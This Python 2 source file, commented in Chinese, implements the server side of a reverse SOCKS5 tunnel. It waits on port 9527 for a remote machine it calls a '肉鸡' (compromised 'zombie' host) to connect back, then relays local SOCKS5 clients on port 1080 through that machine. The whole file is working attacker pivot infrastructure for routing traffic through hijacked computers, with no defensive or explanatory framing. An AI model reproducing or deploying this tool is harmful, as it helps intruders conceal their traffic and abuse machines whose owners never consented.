#!/usr/bin/env python
#coding:utf-8

import select
import socket
import struct 
import time
from sock_v5 import isUnEstablishedSockV5, addUnEstablishedSockV5, makeSockV5Connection, unEstablishedSocks

CHUNCK_SIZE=10240

# 所有socket数据：地址，套接字，未发送完的数据
peers = []	# (addr, fd, [])

def debug():
	import pdb
	pdb.set_trace()

# sendto_dest 仅供 process_tunnel_data 函数调用
def sendto_dest(addr, data):
	global peers
	for _addr, fd, write_queue in peers:
		if addr == _addr:
			write_queue.append(data)
			return
	# 应该给tunnel发送信息：告知断开与addr的连接
	# TODO


tunnel_data = ''
def clear_tunnel_cache():
	'''
		清空Tunnel读队列的所有未处理数据
	'''
	global tunnel_data
	tunnel_data = ''

current_addr = None	# Tunnel中正在处理中的数据块地址
remain_len = 0		# Tunnel中数据块剩余长度
def process_tunnel_data(new_data):
	'''
		处理Tunnel读队列的未处理数据,new_data为新数据
	'''
	global tunnel_data
	global current_addr
	global remain_len
	
	# 将新数据追加到Tunnel的未读队尾
	tunnel_data += new_data

	if remain_len == 0:
		# 开始读取另一个数据块信息
		if len(tunnel_data) < 10:	# 不足一个数据块头部信息
			return
		# 读取一个数据块头部信息
		head = tunnel_data[:10]
		data = tunnel_data[10:]
		a,b,c,d,port,remain_len = struct.unpack('!4BHI', head)
		current_addr = ('%d.%d.%d.%d' % (a,b,c,d), port)
		if remain_len == 0:
			# 数据块头部信息中的Len=0,表示关闭连接
			del_peer_by_addr(current_addr)
			tunnel_data = data
			process_tunnel_data('')
			return
	else:
		# 之前的数据块未读取完毕，继续读取并处理
		data = tunnel_data

	# 转发真正的数据
	if len(data) < remain_len:
		# Tunnel读队列缓存中不足当前数据块数据
		sendto_dest(current_addr, data)
		remain_len -= len(data)
		tunnel_data = ''
	else:
		sendto_dest(current_addr, data[:remain_len])
		tunnel_data = data[remain_len:]
		remain_len = 0
		current_addr = None
		# 前一个数据块处理完毕，继续处理下一个数据块
		if tunnel_data:
			process_tunnel_data('')

def del_peer_by_fd(_fd):
	global peers
	for peer in peers:
		addr, fd, x = peer
		if fd == _fd:
			print '将[%s, %d]移出peers' % (str(addr), _fd.fileno())
			break
	fd.close()
	peers.remove(peer)

def del_peer_by_addr(addr):
	global peers
	found = False
	for peer in peers:
		_addr, fd, x = peer
		if _addr == addr:
			found = True
			print '将[%d, %s]移出peers' % (fd.fileno(), str(addr))
			break
	if found:
		fd.close()
		peers.remove(peer)
	else:
		print '[del_peer_by_addr]can not found [%s] in peers' % str(addr)
		for addr, fd, x in peers:
			print '[del_peer_by_addr]', addr, fd

if __name__ == '__main__':
	server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	server_addr = ('0.0.0.0', 9527)
	server.bind(server_addr)
	server.setblocking(False)
	server.listen(1)
	peers.append((server_addr, server, None))

	local_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	local_server_addr = ('0.0.0.0', 1080)
	local_server.bind(local_server_addr)
	local_server.setblocking(False)
	local_server.listen(10)
	peers.append((local_server_addr, local_server, None))

	tunnel_sock = None
	tunnel_write_queue = []

	while True:

		fds = []
		for x, fd, x in peers:
			fds.append(fd)
		fds.extend(unEstablishedSocks())

		readable, writeable, exceptional = select.select(fds, fds, [], 10)
		
		tunnel_error = False	# 通道错误标志
		data_travaling = False	# 检测是否有数据传输
		
		for fd in readable:
			data_travaling = True
			if fd == server:
				tunnel_sock, addr = server.accept()
				tunnel_write_queue = []
				print '肉鸡上线[%s]' % str(addr)
				peers.append((addr, tunnel_sock, tunnel_write_queue))
			elif fd == local_server:
				local_client_sock ,local_client_addr = local_server.accept()
				print '新sockv5 连接[%s]' % str(local_client_addr)
				addUnEstablishedSockV5(local_client_addr, local_client_sock)
			elif fd == tunnel_sock:
				# Tunnel数据处理
				new_data = fd.recv(CHUNCK_SIZE)
				process_tunnel_data(new_data)
			else:
				# 读取本地连接数据
				if isUnEstablishedSockV5(fd):
					# 尝试建立sock_v5连接
					addr = makeSockV5Connection(fd)
					if addr != None:
						peers.append((addr, fd, []))
				else:
					# 从sockv5客户端读取数据
					try:
						new_data = fd.recv(CHUNCK_SIZE)
					except socket.error, e:
						print e
						new_data = ''
					if not new_data:
						del_peer_by_fd(fd)
					else:
						found = False
						for addr, _fd, write_queue in peers:
							if _fd == fd:
								found = True
								break
						if found:
							print '从本地连接读取[%d]数据,开始送至隧道写队列[%s]' % (len(new_data), str(addr))
							ip, port = addr
							a,b,c,d = map(int, ip.split('.'))
							head = struct.pack('!4BHI', a, b, c, d, port, len(new_data))
							# 将从本地连接读取的数据,加上数据块头部信息，一并写入通道
							tunnel_write_queue.append(head + new_data)
						else:
							print 'Where to send this data?'
							pass
				

		for fd in writeable:
			found = False
			for peer in peers:
				addr, _fd, write_queue = peer
				if fd == _fd and write_queue:
					found = True
					break
			if found:
				data_travaling = True
				try:
					fd.send(write_queue.pop(0))
				except socket.error, e:
					pass


		# Tunnel断裂，重置
		if tunnel_error:
			break

		if not data_travaling:
			#print '没有数据传输，歇5s'
			time.sleep(1)

